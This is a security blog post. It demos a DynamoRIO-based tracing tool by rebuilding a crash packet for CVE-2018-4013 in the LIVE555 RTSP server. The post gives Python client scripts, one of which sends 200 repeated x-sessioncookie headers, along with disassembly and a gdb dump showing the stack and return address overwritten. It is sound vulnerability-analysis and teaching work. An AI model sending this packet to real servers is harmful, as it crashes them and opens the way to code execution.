---
layout: post
title:  "From vulnerability report to a crafted packet using instrumentation"
date:   2018-12-29 14:29:22 +0100
categories: vulnerabilities
---
During these Christmas holidays, I finally had time to implement a small tool that uses dynamic binary instrumentation (*DBI*) to do some runtime checks, that we will see in detail in this post.
I often use tools like *strace*, *ltrace*, *frida-trace* to get some basic runtime information without using a real debugger.

These are all excellent tools, but sometimes I need specific information about functions (symbols access), I need to see the disassembled code only for certain portions of code etc.

So I decided to write this small [tool](https://github.com/invictus1306/functrace), using [DynamoRio](http://dynamorio.org/).

These are some implemented features:

* disassemble all the executed code
* disassemble a specific function
* get arguments of a specific function
* get return value of a specific function
* monitors application signals
* generate a report file

The generated report file can be parsed by [beebug](https://github.com/invictus1306/beebug).

### CVE-2018-4013 analysis

A few months ago, [Cisco Talos](https://www.talosintelligence.com) released the [report](https://www.talosintelligence.com/vulnerability_reports/TALOS-2018-0684) for a vulnerability on the [LIVE555 RTSP](http://www.live555.com/) server library, an excellent report, but the crafted packet is not there. This is the [description](https://www.cvedetails.com/cve/CVE-2018-4013/):

> An exploitable code execution vulnerability exists in the HTTP packet-parsing functionality of the LIVE555 RTSP server library version 0.92. A specially crafted packet can cause a stack-based buffer overflow, resulting in code execution. An attacker can send a packet to trigger this vulnerability.

We will see how to build a crafted packet that give raise to the stack buffer overflow with the help of the *[functrace]*(https://github.com/invictus1306/functrace) client.

You can download the vulnerable version [here](https://download.videolan.org/contrib/live555/) (I downloaded *live.2018.10.10.tar.gz*) and compile it with the default options.

If we run it (*mediaServer/live555MediaServer*) it will listen on port 80 (RTSP-over-HTTP tunneling).

I created a real simple script, to try to interact with the server ([client1.py](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client1.py))

```python
from socket import *

host = "127.0.0.1"
port = 80

def run():
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((host, port))
     header = "User-Agent: Test\r\n x-sessioncookie: BBBB\r\nAccept: AAAA\r\n\r\n"
     s.send(header)

if __name__ == '__main__':
     run()
```

Instrument the server with the *[functrace](https://github.com/invictus1306/functrace)* client

```shell
$ drrun -c libfunctrace.so -report_file report1 -- /home/invictus1306/Documents/article/live/mediaServer/live555MediaServer
```

and run the *[client1.py](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client1.py)* script.

This is the [report1](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/report1) file, and the function:

`RTSPServer::RTSPClientConnection::parseHTTPRequestString`

is there, a good start.

From the *Cisco Talos* report, we can see that the *lookForHeader* function is really important, that's where the overflow takes place.

Our first client (*[client1.py](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client1.py)*) is good, but it must be improved. It might be useful to see the disassembled function (*parseHTTPRequestString*), and we can use *[functrace](https://github.com/invictus1306/functrace)* for this purpose:

```shell
$ drrun -c libfunctrace.so -report_file report2 -disas_func RTSPServer::RTSPClientConnection::parseHTTPRequestString -- /home/invictus1306/Documents/article/live/mediaServer/live555MediaServer
```

and run again the *[client1.py](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client1.py)* script.

This is the [report2](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/report2) file, where we can see the disassembled code of the *parseHTTPRequestString* function.

```assembly
[ADDR] Start address: 0x406700 End Address: 0x4068ff PC: 0x406700 Function: RTSPServer::RTSPClientConnection::parseHTTPRequestString
TAG  0x0000000000406700
 +0    L3                      55                   push   rbp
 +1    L3                      53                   push   rbx
 +2    L3                      83 ea 01             sub    edx, 0x01
 +5    L3                      48 83 ec 08          sub    rsp, 0x08
 +9    L3                      8b af 64 9c 00 00    mov    ebp, dword ptr [rdi+0x00009c64]
 +15   L3                      85 ed                test   ebp, ebp
 +17   L3                      0f 84 d2 00 00 00    jz     0x00000000004067e9
END 0x0000000000406700

[ADDR] Start address: 0x406700 End Address: 0x4068ff PC: 0x406717 Function: RTSPServer::RTSPClientConnection::parseHTTPRequestString
TAG  0x0000000000406717
 +0    L3                      85 d2                test   edx, edx
 +2    L3                      0f 84 ca 00 00 00    jz     0x00000000004067e9
END 0x0000000000406717

...
```

If we want to see it graphically, we can use [beebug](https://github.com/invictus1306/beebug) in this way;

```shell
$ python3 beebug.py -i -r report2
```

The report file is a *png* file

![1546005543085](https://raw.githubusercontent.com/invictus1306/invictus1306.github.io/master/res/functrace/report.PNG)



I want also get the arguments and the return value of the function *parseHTTPRequestString* (8 arguments)

```shell
$ drrun -c libfunctrace.so -report_file report3 -disas_func RTSPServer::RTSPClientConnection::parseHTTPRequestString -wrap_function RTSPServer::RTSPClientConnection::parseHTTPRequestString -wrap_function_args 8 -- /home/invictus1306/Documents/article/live/mediaServer/live555MediaServer
```

the [report3](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/report3) file contains all the information that we need:

```shell
[ARG] Arg 0: 0x6a6900
[ARG] Arg 1: 0x7ffd0cc73430
[ARG] Arg 2: 0xc8
[ARG] Arg 3: 0x7ffd0cc735d0
[ARG] Arg 4: 0xc8
[ARG] Arg 5: 0x7ffd0cc73840
[ARG] Arg 6: 0xc8
[ARG] Arg 7: 0x7ffd0cc73910

[RET] Function: RTSPServer::RTSPClientConnection::parseHTTPRequestString ret_value: 0x0
```

We can notice that the return value is 0 (*return False*).

This is one of the last basic blocks

```c
[ADDR] Start address: 0x406700 End Address: 0x4068ff PC: 0x4067a9 Function: RTSPServer::RTSPClientConnection::parseHTTPRequestString*
*TAG  0x00000000004067a9*
 *+0    L3                      41 8d 42 01          lea    eax, [r10+0x01]*
 *+4    L3                      41 89 c2             mov    r10d, eax*
 *+7    L3                      41 80 fb 48          cmp    r11l, 0x48*
 *+11   L3                      75 da                jnz    0x0000000000406790*
*END 0x00000000004067a9
```

 Open the server with [radare2](https://rada.re/r/) (in order to have the whole code)

```assembly
[0x004067a9]> s 0x4067a9
[0x004067a9]> pd 10
|      ::   0x004067a9      418d4201       lea eax, [r10 + 1]     ; 1
|      ::   0x004067ad      4189c2         mov r10d, eax
|      ::   ; CODE XREF from 0x00406785 (sym.RTSPServer::RTSPClientConnection::parseHTTPRequestString_char__unsignedint_char__unsignedint_char__unsignedint_char__unsignedint)
|      ::   0x004067b0      4180fb48       cmp r11b, 0x48              ; 'H' ; 72
|      ==< 0x004067b4      75da           jne 0x406790
|       :   0x004067b6      4489d0         mov eax, r10d
|       :   0x004067b9      440fb61c03     movzx r11d, byte [rbx + rax]
|       :   0x004067be      4180fb54       cmp r11b, 0x54              ; 'T' ; 84
|=< 0x004067c2      75cc           jne 0x406790
|           0x004067c4      418d7201       lea esi, [r10 + 1]          ; 1
|           0x004067c8      803c3354       cmp byte [rbx + rsi], 0x54  ; [0x54:1]=255 ; 'T' ; 84`
```

and after a brief analysis, we can notice that the server is looking for the string "*HTTP/*", before the first *\r* or *\n* .

So we can edit the the client script in that way (file: [client2.py](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client2.py))

```python
from socket import *

host = "127.0.0.1"
port = 80

def run():
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((host, port))
     header = " HTTP/\r\n x-sessioncookie: BBBB\r\nAccept: AAAA\r\n\r\n"
     s.send(header)

if __name__ == '__main__':
     run()
```

If we run again the instrumented server

```shell
$ drrun -c libfunctrace.so -report_file report4 -- /home/invictus1306/Documents/article/live/mediaServer/live555MediaServer
```

with the new python client ([client2.py](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client2.py)),  we can see inside the report4 file the *lookForHeader* function

```c
[ADDR] Start address: 0x406580 End Address: 0x4066f7 PC: 0x406580 Function: lookForHeader
```

We are ready to go on with the analysis, we already know the problem, this has been described in the *Cisco Talos* report, if we look into the disassembled code of the *lookForHeader* function, there are 2 important instructions:

1. *0x40659a*
2. *0x4066b7*

**Address 0x40659a**

```asm
0x0040659a      c60100         mov byte [rcx], 0
0x0040659d      48890c24       mov qword [rsp], rcx
```

it means:

```c
resultStr[0] = '\0'; // by default, return an empty string
```

**Address 0x4066b7**

```assembly
0x004066a8      4883c201       add rdx, 1
0x004066ac      0fb64aff       movzx ecx, byte [rdx - 1]
0x004066b0      4883c601       add rsi, 1
0x004066b4      4839c2         cmp rdx, rax
0x004066b7      884eff         mov byte [rsi - 1], cl
0x004066ba      75ec           jne 0x4066a8
```

The *lookForHeader* function is called 2 times

```c
lookForHeader("x-sessioncookie", &reqStr[i], reqStrSize-i, sessionCookie, sessionCookieMaxSize);
lookForHeader("Accept", &reqStr[i], reqStrSize-i, acceptStr, acceptStrMaxSize);
```

If we send a proper packet with this header:

```html
...
x-sessioncookie: BBBB
...
```

At line *0x004066ac* the value of the fist byte is put inside *ecx*.

At line *0x004066b7* the byte read, is put into *[rsi - 1]*.

The contents of the *rsi* register is an address, and it is the *resultStr* variable (local variable array with a fix size of *200*, it is allocated in the stack).

If there are many *x-sessioncookie* (or *Accept*), the *resultStr* address continues to increment (line *0x4066cb*) until a stack overflow is triggered.

This is the code that send the crafted packet ([client3.py](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client3.py))

```python
from socket import *

host = "127.0.0.1"
port = 80

def run():
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((host, port))
     payload = "x-sessioncookie: BBBB\r\n"*200
     header = " HTTP/\r\n" + payload + "Accept: AAAA\r\n\r\n"
     s.send(header)

if __name__ == '__main__':
     run()
```

Verify it with the debugger:

```shell
gdb /home/invictus1306/Documents/article/live/mediaServer/live555MediaServer
```

set these 2 breakpoint:

```c
b *0x40659A
b *0x4066cb
b RTSPServer::RTSPClientConnection::handleRequestBytes(int)
```

Run the server and run the *[client3](https://github.com/invictus1306/invictus1306.github.io/blob/master/res/functrace/client3.py)* python script, so the first we reach the first breakpoint in the *handleRequestBytes* function, the stack pointer contains the return value

```c
gef➤  x/x $sp
0x7fffffffe0e8:	0x00406077
```

Go on, and we reach the second breakpoint at address *0x40659A*

```c
$rcx   : 0x00007fffffffde40
```

So the address of *resultStr* is *0x00007fffffffde40*.

At the end of the function, this is the state:

```c
gef➤  x/180x 0x00007fffffffde40
0x7fffffffde40:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffde50:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffde60:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffde70:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffde80:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffde90:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdea0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdeb0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdec0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffded0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdee0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdef0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf00:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf10:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf20:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf30:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf40:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf50:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf60:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf70:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf80:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdf90:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdfa0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdfb0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdfc0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdfd0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdfe0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffdff0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe000:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe010:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe020:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe030:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe040:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe050:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe060:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe070:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe080:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe090:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0a0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0b0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0c0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0d0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0e0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0f0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe100:	0x42424242	0x42424242	0x42424242	0x42424242
```

We can see that the return value of the function *handleRequestBytes* (*0x7fffffffe0e8*) has been overwritten along with other local variables.

### Conclusion

In this post, I wanted to demonstrate how to use *[functrace](https://github.com/invictus1306/functrace)* to analyze vulnerabilities, but it could also be used for other purposes.

In the future I will add other features that could be useful for these purposes.
